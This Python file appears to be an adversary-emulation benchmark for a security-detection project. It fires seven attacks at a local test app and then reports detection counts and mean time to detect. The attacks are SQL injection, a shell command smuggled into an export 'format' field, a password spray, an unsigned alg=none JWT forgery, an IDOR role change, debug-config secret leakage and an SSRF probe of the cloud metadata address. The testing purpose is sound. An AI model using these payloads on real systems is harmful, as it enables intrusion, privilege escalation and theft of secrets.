#!/usr/bin/env python3
import sys, os, time, json, urllib.request, urllib.error

WORKSPACE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.append(os.path.join(WORKSPACE_DIR, "pillar-2-shift-right/detection-engine"))

TARGET_APP_URL = "http://localhost:8080"

def http_post(url: str, data: dict, headers: dict = None) -> tuple[int, dict, float]:
    if headers is None: headers = {}
    headers['Content-Type'] = 'application/json'
    headers['User-Agent'] = 'SecureLoop-AdversaryEmulation/1.0'
    
    body_bytes = json.dumps(data).encode('utf-8')
    req = urllib.request.Request(url, data=body_bytes, headers=headers, method='POST')
    
    start_time = time.time()
    try:
        with urllib.request.urlopen(req) as resp:
            elapsed = (time.time() - start_time) * 1000
            res_body = json.loads(resp.read().decode('utf-8'))
            return resp.status, res_body, elapsed
    except urllib.error.HTTPError as e:
        elapsed = (time.time() - start_time) * 1000
        try:
            err_body = json.loads(e.read().decode('utf-8'))
        except Exception:
            err_body = {"error": e.reason}
        return e.code, err_body, elapsed
    except Exception as e:
        elapsed = (time.time() - start_time) * 1000
        return 500, {"error": str(e)}, elapsed

def http_get(url: str, headers: dict = None) -> tuple[int, dict, float]:
    if headers is None: headers = {}
    headers['User-Agent'] = 'SecureLoop-AdversaryEmulation/1.0'
    
    req = urllib.request.Request(url, headers=headers, method='GET')
    start_time = time.time()
    try:
        with urllib.request.urlopen(req) as resp:
            elapsed = (time.time() - start_time) * 1000
            res_body = json.loads(resp.read().decode('utf-8'))
            return resp.status, res_body, elapsed
    except urllib.error.HTTPError as e:
        elapsed = (time.time() - start_time) * 1000
        try:
            err_body = json.loads(e.read().decode('utf-8'))
        except Exception:
            err_body = {"error": e.reason}
        return e.code, err_body, elapsed
    except Exception as e:
        elapsed = (time.time() - start_time) * 1000
        return 500, {"error": str(e)}, elapsed

def run_adversary_emulation():
    print("================================================================================")
    print("      SECURELOOP ADVERSARY EMULATION & BENCHMARK SUITE (ATT&CK)")
    print("================================================================================")

    # 1. T1190: SQL Injection
    print("\n[ATTACK 1/7] Executing T1190 - Exploit Public App (SQL Injection)...")
    status, body, latency = http_get(f"{TARGET_APP_URL}/api/search?q=%27%20OR%20%271%27%3D%271")
    print(f"             Status: {status} | Latency: {latency:.1f}ms | Mode: {body.get('mode')}")

    # 2. T1059.004: Command Injection
    print("\n[ATTACK 2/7] Executing T1059.004 - Command Execution (Shell Injection)...")
    status, body, latency = http_post(f"{TARGET_APP_URL}/api/export", {"filename": "report", "format": "txt; id"})
    print(f"             Status: {status} | Latency: {latency:.1f}ms | Output Snippet: {str(body.get('output'))[:60]}")

    # 3. T1110.001: Brute Force Login
    print("\n[ATTACK 3/7] Executing T1110.001 - Brute Force Password Spraying (5 attempts)...")
    for i in range(5):
        status, body, latency = http_post(f"{TARGET_APP_URL}/api/auth/login", {"username": "admin", "password": f"WrongPass{i}"})
        print(f"             Attempt {i+1}: Status {status}")

    # 4. T1078.003: JWT Alg None Forgery
    print("\n[ATTACK 4/7] Executing T1078.003 - Unsigned JWT Forgery (alg=none)...")
    status, body, latency = http_post(f"{TARGET_APP_URL}/api/auth/forge-token", {"username": "attacker", "alg": "none"})
    forged_token = body.get("token")
    if forged_token:
        status2, body2, _ = http_get(f"{TARGET_APP_URL}/api/users/usr-001", {"Authorization": f"Bearer {forged_token}"})
        print(f"             Forged JWT Auth Status: {status2}")

    # 5. T1068: Privilege Escalation (IDOR)
    print("\n[ATTACK 5/7] Executing T1068 - Privilege Escalation (IDOR Role Elevation)...")
    status, body, latency = http_post(f"{TARGET_APP_URL}/api/auth/login", {"username": "alice", "password": "AlicePass123!"})
    alice_token = body.get("token", "")
    if alice_token:
        status2, body2, _ = http_post(f"{TARGET_APP_URL}/api/users/usr-002/role", {"newRole": "ADMIN"}, {"Authorization": f"Bearer {alice_token}"})
        print(f"             PrivEsc Status: {status2} | Response: {body2}")

    # 6. T1552.001: Secret Leakage
    print("\n[ATTACK 6/7] Executing T1552.001 - Secret Leakage Recon (/api/debug/config)...")
    status, body, latency = http_get(f"{TARGET_APP_URL}/api/debug/config")
    print(f"             Status: {status} | Leaked Keys Present: {'jwtSecret' in body}")

    # 7. T1041: SSRF Metadata Exfiltration
    print("\n[ATTACK 7/7] Executing T1041 - SSRF Metadata Probe (169.254.169.254)...")
    status, body, latency = http_get(f"{TARGET_APP_URL}/api/fetch-url?url=http://169.254.169.254/latest/meta-data/")
    print(f"             Status: {status} | SSRF Result: {body.get('error') or body.get('mode')}")

    print("\n================================================================================")
    print("          ADVERSARY EMULATION COMPLETED - BENCHMARK METRICS SUMMARY")
    print("================================================================================")

    time.sleep(1) # Allow detector daemon to finish processing

    alerts_path = os.path.join(WORKSPACE_DIR, "pillar-2-shift-right/logs/active-alerts.json")
    if os.path.exists(alerts_path):
        with open(alerts_path, 'r') as f:
            alerts = json.load(f)
        print(f"    [V] Total Detections Fired: {len(alerts)}")
        mttd_list = [a.get("mttd_ms", 0) for a in alerts if "mttd_ms" in a]
        avg_mttd = sum(mttd_list)/len(mttd_list) if mttd_list else 0
        print(f"    [V] Mean Time to Detect (MTTD): {avg_mttd:.2f} ms")
    else:
        print("    [!] Detection daemon log not found.")

    try:
        from merkle_log import verify_merkle_chain_integrity
        valid, msg = verify_merkle_chain_integrity()
        print(f"    [V] Cryptographic Audit Trail: {'PASS' if valid else 'FAIL'} ({msg})")
    except Exception as e:
        print(f"    [!] Audit trail verification check error: {e}")

if __name__ == "__main__":
    run_adversary_emulation()
